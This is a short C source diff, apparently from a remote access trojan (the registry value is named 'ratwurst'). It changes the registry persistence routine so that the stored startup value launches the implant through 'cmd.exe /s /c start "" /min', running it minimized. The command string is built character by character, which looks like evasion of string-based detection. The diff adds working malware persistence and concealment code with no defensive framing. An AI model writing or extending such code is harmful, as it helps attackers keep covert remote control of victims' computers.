@@ -371,12 +371,21 @@ int SetupRegistryKey(const char* execPath)
 		return 1;
 	}
 
+	// cmd.exe /s /c start "" /min C:\Users\karlo\AppData\Local\Temp\rtwst.tmp
+	char ca_command[] = { 'c','m','d','.','e','x','e',' ','/','s',' ','/','c',' ','s','t','a','r','t',' ','"','"',' ','/','m','i','n',' ',0 };
+	size_t lenCommand = strlen(ca_command) + 1;
+	size_t lenExecPath = strlen(execPath) + 1;
+	int lenRegValue = lenCommand + lenExecPath;
+	char* regValue = (char*)calloc(lenRegValue, sizeof(char));
+	strncpy_s(regValue, lenRegValue, ca_command, lenCommand);
+	strncat_s(regValue, lenRegValue, execPath, lenExecPath);
+	
 	LSTATUS regSetStatus = RegSetValueExA(keyHandle,
 										  "ratwurst",
 										  0,
 										  REG_SZ,
-										  (const BYTE *)execPath,
-										  (DWORD)strlen(execPath));
+										  (const BYTE *)regValue,
+										  (DWORD)lenRegValue);
 	if ( regSetStatus != ERROR_SUCCESS )
 	{
 #if DEBUG
@@ -384,6 +393,8 @@ int SetupRegistryKey(const char* execPath)
 #endif
 		return 1;
 	}
+
+	free(regValue);
 
 	RegCloseKey(keyHandle);
 	return 0;
